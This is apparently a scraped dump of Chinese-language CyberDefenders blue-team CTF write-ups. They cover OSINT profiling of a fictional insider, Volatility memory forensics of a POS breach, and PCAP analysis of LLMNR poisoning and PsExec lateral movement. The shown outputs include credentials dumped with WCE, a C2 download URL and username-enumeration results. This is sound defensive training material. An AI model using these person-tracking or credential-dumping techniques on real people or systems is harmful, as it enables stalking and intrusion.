# 還是和上一題一樣慢慢找，終於找到一個base64的密碼 \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#39;UGljYXNzb0JhZ3VldHRlOTk=\u0026#39;) b\u0026#39;PicassoBaguette99\u0026#39; :::spoiler Flag Flag: PicassoBaguette99 :::\n==Q3== # File -\u0026gt; Github.txt: What is the plaintext password the insider added to his GitHub repositories?\nRecon # 像第一題一樣直接key word search :::spoiler Flag Flag: xmrig :::\n==Q4== # What university did the insider go to?\nRecon # 看了第一個hint，發現可以用linkedin找大學\n:::spoiler Flag Flag: Sorbonne :::\n==Q5== # What gaming website the insider had an account on?\nExploit # 這一題是通靈，答案是steam，但是其實在此刻(2023/11/06)，這個帳號已經消失了，所以就算用sherlock，都會找不到\n$ conda create --name sherlock python=3.10 -y $ pip install -r requirements.txt $ python sherlock/sherlock.py EMarseille99 [*] Checking username EMarseille99 on: [+] CNET: https://www.cnet.com/profiles/EMarseille99/ [+] Dealabs: https://www.dealabs.com/profile/EMarseille99 [+] G2G: https://www.g2g.com/EMarseille99 [+] GitHub: https://www.github.com/EMarseille99 [+] Lolchess: https://lolchess.gg/profile/na/EMarseille99 [+] Twitter: https://twitter.com/EMarseille99 [+] Virgool: https://virgool.io/@EMarseille99 [+] Whonix Forum: https://forums.whonix.org/u/EMarseille99/summary [+] metacritic: https://www.metacritic.com/user/EMarseille99 [*] Search completed with 9 results :::spoiler Flag Flag: steam :::\n==Q6== # What is the link to the insider Instagram profile?\nRecon # 直接google search: Émilie Marseille\n:::spoiler Flag Flag: https://www.instagram.com/emarseille99/ :::\n==Q7== # Where did the insider go on the holiday? (Country only)\nRecon # 直接看IG的貼文，可以用image search搜尋圖片，發現這就是新加坡濱海灣金沙飯店 :::spoiler Flag Flag: Singapore :::\n==Q8== # Where is the insider\u0026rsquo;s family live? (City only)\nRecon # 可以先觀察IG post 1和IG post 2 Exploit # 第一張圖片可以看到若隱若現的國旗，可能是Jordan / Palestine / United Arab Emirates，這三個國家的國旗都很像，再看第二張圖片可以發現有一個高塔，幾乎確定就是杜拜塔，也很符合他的國家(United Arab Emirates)\n:::spoiler Flag Flag: Dubai :::\n==Q9== # File -\u0026gt; office.jpg: You have been provided with a picture of the building in which the company has an office. Which city is the company located in?\nRecon # 直接找hippodrome theatre chinese quarter就知道是在英國的Birmingham\n:::spoiler Flag Flag: Birmingham :::\n==Q10== # File -\u0026gt; Webcam.png: With the intel, you have provided, our ground surveillance unit is now overlooking the person of interest\u0026rsquo;s suspected address. They saw them leaving their apartment and followed them to the airport. Their plane took off and has landed in another country. Our intelligence team spotted the target with this IP camera. Which state is this camera in?\nRecon # 直接丟到image search就知道是university of notre dame，就在印第安納州\n:::spoiler Flag Flag: INDIANA :::\nReference # "},{"id":83,"href":"/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/","title":"CyberDefender - MrRobot - POS","section":"Securities","content":" CyberDefender - MrRobot - POS # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/88 Target 1: https://hackmd.io/@SBK6401/SkJAThwla Target 2: https://hackmd.io/@SBK6401/HJz2FPne6\n:::spoiler TOC [TOC] :::\nLab - POS # 起手式 # $ volatility_2.6_win64_standalone.exe -f memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (D:\\NTU\\CTF\\CyberDefenders\\c69-Grrcon2015\\pos01\\memory.dmp) PAE type : PAE DTB : 0x3ecde260L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2015-10-09 12:52:56 UTC+0000 Image local date and time : 2015-10-09 08:52:56 -0400 重要資訊System Name:\n==Q21== # What is the malware CNC\u0026rsquo;s server?\nBackground # 輕鬆理解什麼是 C\u0026amp;C 伺服器 原文網址：https://itw01.com/2G2BLEW.html\n通常我們在網路上看到的文章說 C\u0026amp;C 伺服器的 IP 地址或者域名，這裏的 C\u0026amp;C 伺服器說的就是上面的中轉伺服器，為什麼是中轉伺服器而不是本地主機呢？ 那是因為中轉伺服器是惡意軟體和僵屍網絡的直連伺服器，是最直接接觸的伺服器，通常在惡意軟體分析或者僵屍網絡分析的時候首先分析出來的，所有控制者傳送的指令都是經過中轉伺服器傳送到目標伺服器的\nRecon # 看了前面的background就可以直覺想到應該是和網路的部分相關，那就是直接netscan看IP符合題目的提示\nExploit # 我的想法是既然是類似webshell的操作，代表應該是能夠開webshell的process，剛好iexplorer.exe的IP\n$ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 netscan Offset(P) Proto Local Address Foreign Address State Pid Owner Created ... 0x3e135df8 TCPv4 10.1.1.10:58751 54.84.237.92:80 CLOSE_WAIT 3208 iexplore.exe ... :::spoiler Flag Flag: 54.84.237.92 :::\n==Q22== # What is the common name of the malware used to infect the POS system?\nRecon # 這一題又是新的觀念，本來以為會事和pslist之類的有關，但看了1的說明才知道具體怎麼做，首先通過前一題，我們知道iexplore.exe的操作有點問題，但iexplore.exe應該是個沒啥問題的process，再者通過題幹可以知道他應該是被malware注入或是操到其他的攻擊，此時就可以把該process dump出來，但不是利用procdump而是要搭配malfind才對，因為如果用procdump他是直接把iexplore.exe dump出來，丟到virustotal八成是沒啥問題\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 malfind | findstr iexplore Volatility Foundation Volatility Framework 2.6 Process: iexplore.exe Pid: 3208 Address: 0x50000 Process: iexplore.exe Pid: 3136 Address: 0x50000 $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 malfind --pid 3208 -D .\\output 可以先看一下malfind的全部結果再決定要特別把哪一個process dump出來，丟到virustotal之後會看到八成是dexter這支trojan malware，詳細結果可以看這邊，另外我還有看到ithome的這篇早期的文章，FYI，PoS系統遭致Dexter木馬程式感染!鴻璟科技提供專業的安全對策\n:::spoiler Flag Flag: dexter :::\n==Q23== # In the POS malware whitelist. What application was specific to Allsafecybersec?\nRecon # 這一題要找的是Allsafecybersec有哪些特別的應用程式，正確的操作是先把該process有使用到的dll dump出來，然後再sting search查看，不過看了1的操作，也是可以直接把前一題的process dump出來的結果，string search看一下.exe有哪一些，如果要看嚴謹的版本可以看2，不過我是覺得這一題問的很奇怪就是了，看了半天也不知道要表達甚麼\nExploit # $ strings process.0x83f324d8.0x50000.dmp | grep \u0026#39;.exe\u0026#39; allsafe_protector.exe svchost.exe iexplore.exe explorer.exe smss.exe csrss.exe winlogon.exe lsass.exe spoolsv.exe alg.exe wuauclt.exe .exe;.bat;.reg;.vbs; iexplore.exe lHost.exe :::spoiler Flag Flag: allsafe_protector.exe :::\n==Q24== # What is the name of the file the malware was initially launched from?\nBackground # $ volatility_2.6_win64_standalone.exe -h ... iehistory Reconstruct Internet Explorer cache / history Recon # 因為前面都有提到此malware是透過注入ieplore.exe來達到C\u0026amp;C Server的目的，因此可以用iehistory這個plugin查看儲存在cache中的紀錄\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 iehistory Volatility Foundation Volatility Framework 2.6 ************************************************** Process: 1836 explorer.exe Cache type \u0026#34;DEST\u0026#34; at 0x510182b Last modified: 2015-10-09 08:35:57 UTC+0000 Last accessed: 2015-10-09 12:35:58 UTC+0000 URL: pos@http://54.84.237.92/allsafe_update.exe ************************************************** Process: 1836 explorer.exe Cache type \u0026#34;DEST\u0026#34; at 0x5101b93 Last modified: 2015-10-09 08:35:57 UTC+0000 Last accessed: 2015-10-09 12:35:58 UTC+0000 URL: pos@http://54.84.237.92/allsafe_update.exe :::spoiler Flag Flag: allsafe_update.exe :::\nReference # MrRobot Walkthrough — Cyberdefenders\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCyberDefenders: Mr. Robot\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":84,"href":"/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/","title":"CyberDefender - MrRobot - Target 2","section":"Securities","content":" CyberDefender - MrRobot - Target 2 # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/88 Target 1: https://hackmd.io/@SBK6401/SkJAThwla POS: https://hackmd.io/@SBK6401/BJpJqDhlp\n:::spoiler TOC [TOC] ::: Lecture Video: 2022/06/29 藍隊安全系列課程 04 Volatility - Cheat Sheet\nBackground # Lab - Target 2 # 起手式 # $ volatility_2.6_win64_standalone.exe -f memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (D:\\NTU\\CTF\\CyberDefenders\\c69-Grrcon2015\\target2\\memory.dmp) PAE type : PAE DTB : 0x3ed36260L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2015-10-09 12:53:12 UTC+0000 Image local date and time : 2015-10-09 08:53:12 -0400 重要資訊System Name: Win7SP0x86\n==Q16== # It appears the attacker moved latterly from the front desk machine to the security admins (Gideon) machine and dumped the passwords. What is Gideon\u0026rsquo;s password?\nRecon # 根據題目的敘述，我首先會想看他的console，看他有甚麼樣的檔案或是process上的操作，果不其然他有使用到前面提到的wce.exe工具，並且他把結果存在某一個檔案中，接下來就是把檔案dump出來，看裡面的內容這樣\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 consoles \u0026gt; .\\output\\consoles.txt $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 filescan | findstr w.tmp Volatility Foundation Volatility Framework 2.6 0x000000003fcf2798 8 0 -W-r-- \\Device\\HarddiskVolume2\\Users\\gideon\\w.tmp $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 dumpfiles -n -D .\\output -Q 0x000000003fcf2798 Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3fcf2798 None \\Device\\HarddiskVolume2\\Users\\gideon\\w.tmp $ strings file.None.0x85a35da0.w.tmp.dat WCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com) Use -h for help. gideon\\ALLSAFECYBERSEC:t76fRJhS GIDEON-PC$\\ALLSAFECYBERSEC:s9O3t%sd1q\u0026gt;:u5Za8Xrx_3Eg;(\\qapu\u0026lt;\u0026#34;Rn$#QQJlsD m#;z2hbJkr*tLe\u0026gt;0)F[S)\u0026#39;USh3BKJILn3-?vt]q=s-Cp.ws9wVik[]5?#F\\*l/J19+`PYco:au;T :::spoiler Flag Flag: t76fRJhS :::\n==Q17== # Once the attacker gained access to \u0026ldquo;Gideon,\u0026rdquo; they pivoted to the AllSafeCyberSec domain controller to steal files. It appears they were successful. What password did they use?\nBackground # rar.exe的使用方法\n-HP ：帶文件頭加密，更安全，沒有密碼無法查看里面的文件列表\nRecon # 題目敘述提到的狀況可以從console中看出來，可以看到他先把c槽掛在自己的z槽上面(這可能需要一點AD的概念才會比較清楚，可以看之前寫的NTUSTISC - AD Note - Lab(SMB遠端讀寫))，然後把一個rar.exe丟到對方的c槽底下(z:\\crownjewels)，接著把所有東西(.txt)都壓縮，而如果知道rar.exe中-hp的意思就知道他後面帶的東西是壓縮的密碼也就是本題的答案\nExploit # :::spoiler Flag Flag: 123qwe!@# :::\n==Q18== # What was the name of the RAR file created by the attackers?\nRecon # 這一題意外的超簡單，就看console中的內容就知道壓縮的檔案名稱是啥了\nExploit # :::spoiler Flag Flag: crownjewlez.rar :::\n==Q19== # How many files did the attacker add to the RAR archive?\nBackground # Recon # 這一題比較複雜，因為如果單看console中的內容會發現dump出來的部分不完全，所以可以把這一個console的process memory dump出來，然後查看裡面的內容\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 memdump --pid 3048 -D .\\output\\ # 按照之前的console查詢結果，可以知道pid是3048 $ strings -el 3048.dmp \u0026gt; 3048.txt $ strings 3048.txt | grep \u0026#39;\\\\crownjewels\\\\\u0026#39;| grep \u0026#34;.txt\u0026#34; \\crownjewels\\SecretSauce2.txt \\crownjewels\\SecretSauce1.txt \\crownjewels\\SecretSauce3.txt 記得要把dump出來的memory轉換成16-bits little endian才能看到完整的可視內容 然後如果看前面console的結果可以得知他是在crownjewels這個folder底下執行rar的壓縮，所以可以下grep的pipe command，可以知道只有三個.txt檔案 :::spoiler Flag Flag: 3 :::\n==Q20== # The attacker appears to have created a scheduled task on Gideon\u0026rsquo;s machine. What is the name of the file associated with the scheduled task?\nBackground # Windows 工作排程 Windows 如何透過工作排程設定開機自動連線\nRecon # 看到scheduled task就要想到windows內建的task scheduler的功能，詳細的工具教學可以看上面的background，總之他新增的東西通常會放在Windows/System32/Tasks，所以我們可以直接用filescan搭配上述地址的關鍵自進行搜尋\nExploit # 可以看到task大部分都是microsoft或是google update的東西，只有一個有點奇怪，應該就是這一題的access point\n$ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 filescan | findstr \\Windows\\System32\\Tasks\\ Volatility Foundation Volatility Framework 2.6 ... 0x000000003fc399b8 8 0 R--r-d \\Device\\HarddiskVolume2\\Windows\\System32\\Tasks\\At1 ... $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 dumpfiles -n -Q 0x000000003fc399b8 -D .\\output Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3fc399b8 None \\Device\\HarddiskVolume2\\Windows\\System32\\Tasks\\At1 $ cat file.None.0x85a86af0.At1.dat ��\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.0\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;TimeTrigger\u0026gt; \u0026lt;StartBoundary\u0026gt;2015-10-09T08:00:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;/TimeTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;UserId\u0026gt;@AtServiceAccount\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveTokenOrPassword\u0026lt;/LogonType\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;c:\\users\\gideon\\1.bat\u0026lt;/Command\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt;% 可以看到執行label寫說要執行c:\\users\\gideon\\1.bat這個script\n:::spoiler Flag Flag: 1.bat :::\nReference # "},{"id":85,"href":"/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/","title":"CyberDefender - PoisonedCredentials","section":"Securities","content":" CyberDefender - PoisonedCredentials # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/146#nav-questions\n:::spoiler TOC [TOC] :::\nScenario # Your organization\u0026rsquo;s security team has detected a surge in suspicious network activity. There are concerns that LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning attacks may be occurring within your network. These attacks are known for exploiting these protocols to intercept network traffic and potentially compromise user credentials. Your task is to investigate the network logs and examine captured network traffic.\nBackground # NetBIOS and LLMNR Poisoning | Attack Demonstration 本機多點傳送名稱解析 (LLMNR) 同時允許 IPv6 和 IPv4 主機為鄰接電腦執行名稱解析，而不需設定 DNS 伺服器或 DNS 用戶端。\n也就是，這是在LAN才會出現的，例如:嘗試使用WakeOnLan的時候，故若你沒有提出此要求，而發現有此封包在攻擊你的電腦時，它肯定就是病毒啦!!\nNetBIOS \u0026amp; NBNS 功能 # 不管使用哪一種傳輸方式，NetBIOS提供三種不同的服務：\n名字服務：名字登記和解析 會話服務：可靠的基於連線的通信 數據包服務：不可靠的無連線通信 當NetBIOS是數據鏈路層協定時，可以通過5Ch中斷訪問其功能。傳遞給這些函式的訊息使用NCB格式。 NetBIOS和NetBEUI被設計為僅僅用於區域網路，因此不支持路由，並且最多只能處理72個節點或者設備。NetBIOS和NetBEUI經常使用廣播實現，尤其是名字服務的相關操作。\n==Q1== # In the context of the incident described in the scenario, the attacker initiated their actions by taking advantage of benign network traffic from legitimate machines. Can you identify the specific mistyped query made by the machine with the IP address 192.168.232.162?\nRecon # 從scenario和題目敘述可以知道幾件事情\n部門遭受LLMNT和NBT-NS poisoning attack，所以重點應該著重在llmnr / nbns這兩個protocol上 Victim應該是192.168.232.162 Exploit # Filter Payload: nbns and ip.addr == 192.168.232.162 :::spoiler Flag Flag: fileshaare :::\n==Q2== # We are investigating a network security incident. For a thorough investigation, we need to determine the IP address of the rogue machine. What is the IP address of the machine acting as the rogue entity?\nRecon # 從前一題可以知道，192.168.232.162是一個victim，所以我們的目標應該是去看誰和他溝通，不管是傳送payload / 檔案等等，就可以確定攻擊的人是誰\nExploit # 可以直接看wireshark的conversation，就知道唯一和他連線溝通的，只有==192.168.232.215== :::spoiler Flag Flag: 192.168.232.215 :::\n==Q3== # During our investigation, it\u0026rsquo;s crucial to identify all affected machines. What is the IP address of the second machine that received poisoned responses from the rogue machine?\nExploit # 和上一題相關，如果是想要直接看誰和attacker連線就直接看conversation最快\n:::spoiler Flag Flag: 192.168.232.176 :::\n==Q4== # We suspect that user accounts may have been compromised. To assess this, we must determine the username associated with the compromised account. What is the username of the account that the attacker compromised?\nRecon # 從題目可以知道，受害者是前一題的==192.168.232.176==，而attacker是==192.168.232.215==，另外兩者溝通的管道通常是smb\nExploit # Filter Payload: smb2 and ip.src==192.168.232.215 and ip.dst==192.168.232.176 :::spoiler Flag Flag: janesmith :::\n==Q5== # As part of our investigation, we aim to understand the extent of the attacker\u0026rsquo;s activities. What is the hostname of the machine that the attacker accessed via SMB?\nExploit # 這一題是看1的說明，有一個ntlm challenge的error，進去看會發現NetBIOS Computer Filter Payload: (ip.addr == 192.168.232.162 or ip.addr == 192.168.232.176 or ip.addr == 192.168.232.215) and (smb2) :::spoiler Flag Flag: accountingpc :::\nReference # PoisonedCredentials-CyberDefenders\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":86,"href":"/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/","title":"CyberDefender - PsExec Hunt","section":"Securities","content":" CyberDefender - PsExec Hunt # :::spoiler [TOC] :::\nScenario # Our Intrusion Detection System (IDS) has raised an alert, indicating suspicious lateral movement activity involving the use of PsExec. To effectively respond to this incident, your role as a SOC Analyst is to analyze the captured network traffic stored in a PCAP file.\n==Q1== # In order to effectively trace the attacker\u0026rsquo;s activities within our network, can you determine the IP address of the machine where the attacker initially gained access?\nRecon # 我判斷的方式很簡單，就直接從endpoints看封包數量，選最多或是前幾多的IP就對了\nExploit # Flag: 10.0.0.130\n==Q2== # To fully comprehend the extent of the breach, can we determine the machine\u0026rsquo;s hostname to which the attacker pivoted?\nRecon # 這一題找超久，題目要找到攻擊者所轉向的電腦主機名稱，首先聚焦在問題中提到的hostname，我一直以為是Browser的host name，但看起來他不是這個意思 我先用export看他哪時候把psexec放到該主機上，可見最早放到主機上的時間是packet #192，所以直覺應該是往前找，畢竟要先把該主機compromised才能做後續的操作 Exploit # 慢慢找會發現packet #131的target name字數剛好和答案相同，不過也和一開始的猜想大致相同，也就是*-PC代表hostname Filter: ntlmssp.challenge.target_name == \u0026quot;SALES-PC\u0026quot; Flag: SALES-PC\n==Q3== # After identifying the initial entry point, it\u0026rsquo;s crucial to understand how far the attacker has moved laterally within our network. Knowing the username of the account the attacker used for authentication will give us insights into the extent of the breach. What is the username utilized by the attacker for authentication?\nRecon # 這一題是找最久的，因為沒有和前面連起來，不然其實應該很快就找到，如果把filter去掉，然後看packet #131左右的其他packet會發現NTLM的authentication user name，這就是這一題的答案，我找到最後還想說用regular expression dump出英文字母六碼的所有結果，最後當然也是沒有然後 Flag: ssales\n==Q4== # After figuring out how the attacker moved within our network, we need to know what they did on the target machine. What\u0026rsquo;s the name of the service executable the attacker set up on the target?\nRecon # 這一題就很簡單了，可以看第二題所得知的export file，他會把所有機器之間通訊的檔案以及hostname/filename都呈現出來，因此這一題很明顯就是PSEXESVC\nFlag: PSEXESVC\n==Q5== # We need to know how the attacker installed the service on the compromised machine to understand the attacker\u0026rsquo;s lateral movement tactics. This can help identify other affected systems. Which network share was used by PsExec to install the service on the target machine?\nRecon # 題目想知道攻擊者選擇哪個network share安裝psexec，所以直覺會想到要用看主機之間傳送的檔案紀錄\nExploit # 呈第二題，既然知道最早是從packet #192把該檔案透過\\\\ADMIN$帳號傳送給別台主機，則答案應該就是ADMIN$\nFlag: ADMIN$\n==Q6== # We must identify the network share used to communicate between the two machines. Which network share did PsExec use for communication?\nRecon # 題目想知道psexec是用哪個network share進行通訊，也是直覺可以從smb的檔案之間的紀錄下手\nExploit # 可以看到\\\\IPC$所傳送的filename包含stdout/stdin/stderr，所以基本上應該就是該帳號在進行通訊\nFlag: IPC$\n==Q7== # Now that we have a clearer picture of the attacker\u0026rsquo;s activities on the compromised machine, it\u0026rsquo;s important to identify any further lateral movement. What is the machine\u0026rsquo;s hostname to which the attacker attempted to pivot within our network?\nRecon # 題目想知道後續的橫向移動的目標是哪一題主機，並指出hostname為何，所以可以從packet #192往後找，或是我們可以直接下filter:ntlmssp.ntlmv2_response.nb_domain_name，就可以知道\nExploit # 要注意的是，NTLM中的NetBIOS Domain Name貌似和SMB2 Host是不一樣的，NTLM中的domain name應該是連接smb的那台主機所處的domain name為何，而smb2 host應該是被連接的那台機器所處的domain，可能是一台印表機之類的，這樣想就蠻合理的，而題目要我們找的是ntlm domain的hostname Flag: MARKETING-PC\n"},{"id":87,"href":"/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/","title":"CyberDefender - RedLine","section":"Securities","content":" CyberDefender - RedLine # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/106 :::spoiler TOC [TOC] :::\nBackground # 這一次的instance必須要使用volatility3才能解\n==Q1== # What is the name of the suspicious process?\nRecon # 直覺會想到直接pslist看有哪一些正在執行的process，不過1提供了不一樣的想法，既然他是可疑的process，那就代表有機會操作一些malware會有的pattern例如injection之類的，所以可以先從malfind下手，看一下有哪一個process正在執行類似的操作\nExploit # 方法一: 直接pslist :::spoiler Command Result $ python vol.py -f MemoryDump.mem windows.pslist PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output 4 0 System 0xad8185883180 157 - N/A False 2023-05-21 22:27:10.000000 N/A Disabled 108 4 Registry 0xad81858f2080 4 - N/A False 2023-05-21 22:26:54.000000 N/Disabled 332 4 smss.exe 0xad81860dc040 2 - N/A False 2023-05-21 22:27:10.000000 N/Disabled 452 444 csrss.exe 0xad81861cd080 12 - 0 False 2023-05-21 22:27:22.000000 N/Disabled 528 520 csrss.exe 0xad8186f1b140 14 - 1 False 2023-05-21 22:27:25.000000 N/Disabled 552 444 wininit.exe 0xad8186f2b080 1 - 0 False 2023-05-21 22:27:25.000000 N/Disabled 588 520 winlogon.exe 0xad8186f450c0 5 - 1 False 2023-05-21 22:27:25.000000 N/Disabled 676 552 services.exe 0xad8186f4d080 7 - 0 False 2023-05-21 22:27:29.000000 N/Disabled 696 552 lsass.exe 0xad8186fc6080 10 - 0 False 2023-05-21 22:27:29.000000 N/Disabled 824 676 svchost.exe 0xad818761d240 22 - 0 False 2023-05-21 22:27:32.000000 N/Disabled 852 552 fontdrvhost.ex 0xad818761b0c0 5 - 0 False 2023-05-21 22:27:33.000000 N/Disabled 860 588 fontdrvhost.ex 0xad818761f140 5 - 1 False 2023-05-21 22:27:33.000000 N/Disabled 952 676 svchost.exe 0xad81876802c0 12 - 0 False 2023-05-21 22:27:36.000000 N/Disabled 1016 588 dwm.exe 0xad81876e4340 15 - 1 False 2023-05-21 22:27:38.000000 N/A Disabled 448 676 svchost.exe 0xad8187721240 54 - 0 False 2023-05-21 22:27:41.000000 N/Disabled 752 676 svchost.exe 0xad8187758280 21 - 0 False 2023-05-21 22:27:43.000000 N/Disabled 1012 676 svchost.exe 0xad818774c080 19 - 0 False 2023-05-21 22:27:43.000000 N/Disabled 1196 676 svchost.exe 0xad81877972c0 34 - 0 False 2023-05-21 22:27:46.000000 N/Disabled 1280 4 MemCompression 0xad8187835080 62 - N/A False 2023-05-21 22:27:49.000000 N/Disabled 1376 676 svchost.exe 0xad81878020c0 15 - 0 False 2023-05-21 22:27:49.000000 N/Disabled 1448 676 svchost.exe 0xad818796c2c0 30 - 0 False 2023-05-21 22:27:52.000000 N/Disabled 1496 676 svchost.exe 0xad81879752c0 12 - 0 False 2023-05-21 22:27:52.000000 N/Disabled 1644 676 svchost.exe 0xad8187a112c0 6 - 0 False 2023-05-21 22:27:58.000000 N/Disabled 1652 676 svchost.exe 0xad8187a2d2c0 10 - 0 False 2023-05-21 22:27:58.000000 N/Disabled 1840 676 spoolsv.exe 0xad8187acb200 10 - 0 False 2023-05-21 22:28:03.000000 N/Disabled 1892 676 svchost.exe 0xad8187b34080 14 - 0 False 2023-05-21 22:28:05.000000 N/Disabled 2024 676 svchost.exe 0xad8187b65240 7 - 0 False 2023-05-21 22:28:11.000000 N/Disabled 2076 676 svchost.exe 0xad8187b94080 10 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2144 676 vmtoolsd.exe 0xad81896ab080 11 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2152 676 vm3dservice.ex 0xad81896ae240 2 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2200 676 VGAuthService. 0xad81896b3300 2 - 0 False 2023-05-21 22:28:19.000000 N/Disabled 2404 2152 vm3dservice.ex 0xad8186619200 2 - 1 False 2023-05-21 22:28:32.000000 N/Disabled 3028 676 dllhost.exe 0xad8185907080 12 - 0 False 2023-05-21 22:29:20.000000 N/Disabled 832 676 msdtc.exe 0xad8185861280 9 - 0 False 2023-05-21 22:29:25.000000 N/Disabled 1232 676 svchost.exe 0xad8186f4a2c0 7 - 0 False 2023-05-21 22:29:39.000000 N/Disabled 1392 448 sihost.exe 0xad8189e94280 11 - 1 False 2023-05-21 22:30:08.000000 N/Disabled 1064 676 svchost.exe 0xad8189d7c2c0 15 - 1 False 2023-05-21 22:30:09.000000 N/Disabled 1600 448 taskhostw.exe 0xad8189d07300 10 - 1 False 2023-05-21 22:30:09.000000 N/Disabled 3204 752 ctfmon.exe 0xad8189c8b280 12 - 1 False 2023-05-21 22:30:11.000000 N/Disabled 3556 588 userinit.exe 0xad818c02f340 0 - 1 False 2023-05-21 22:30:28.000000 2023-05-21 22:30:43.000000 Disabled 3580 3556 explorer.exe 0xad818c047340 76 - 1 False 2023-05-21 22:30:28.000000 N/Disabled 3944 824 WmiPrvSE.exe 0xad818c054080 13 - 0 False 2023-05-21 22:30:44.000000 N/Disabled 3004 676 svchost.exe 0xad818c4212c0 7 - 0 False 2023-05-21 22:30:55.000000 N/Disabled 1116 676 svchost.exe 0xad818c426080 6 - 1 False 2023-05-21 22:31:00.000000 N/Disabled 3160 824 StartMenuExper 0xad818cad3240 14 - 1 False 2023-05-21 22:31:21.000000 N/Disabled 4116 824 RuntimeBroker. 0xad818cd93300 3 - 1 False 2023-05-21 22:31:24.000000 N/Disabled 4228 676 SearchIndexer. 0xad818ce06240 15 - 0 False 2023-05-21 22:31:27.000000 N/Disabled 4448 824 RuntimeBroker. 0xad818c09a080 9 - 1 False 2023-05-21 22:31:33.000000 N/Disabled 464 3580 SecurityHealth 0xad818979d080 3 - 1 False 2023-05-21 22:31:59.000000 N/Disabled 3252 3580 vmtoolsd.exe 0xad8189796300 8 - 1 False 2023-05-21 22:31:59.000000 N/Disabled 5136 676 SecurityHealth 0xad818d374280 7 - 0 False 2023-05-21 22:32:01.000000 N/Disabled 5328 3580 msedge.exe 0xad818d0980c0 54 - 1 False 2023-05-21 22:32:02.000000 N/Disabled 4396 5328 msedge.exe 0xad818d515080 7 - 1 False 2023-05-21 22:32:19.000000 N/Disabled 1144 5328 msedge.exe 0xad818d75f080 18 - 1 False 2023-05-21 22:32:38.000000 N/Disabled 4544 5328 msedge.exe 0xad818d75b080 14 - 1 False 2023-05-21 22:32:39.000000 N/Disabled 5340 5328 msedge.exe 0xad818d7b3080 10 - 1 False 2023-05-21 22:32:39.000000 N/Disabled 5704 824 RuntimeBroker. 0xad8185962080 5 - 1 False 2023-05-21 22:32:44.000000 N/Disabled 1764 824 dllhost.exe 0xad818d176080 7 - 1 False 2023-05-21 22:32:48.000000 N/Disabled 1916 824 SearchApp.exe 0xad818d099080 24 - 1 False 2023-05-21 22:33:05.000000 N/Disabled 6200 676 SgrmBroker.exe 0xad818d09f080 7 - 0 False 2023-05-21 22:33:42.000000 N/Disabled 6696 676 svchost.exe 0xad818c532080 8 - 0 False 2023-05-21 22:34:07.000000 N/Disabled 7312 824 ApplicationFra 0xad818e84f300 10 - 1 False 2023-05-21 22:35:44.000000 N/Disabled 7772 676 svchost.exe 0xad818e88e140 3 - 0 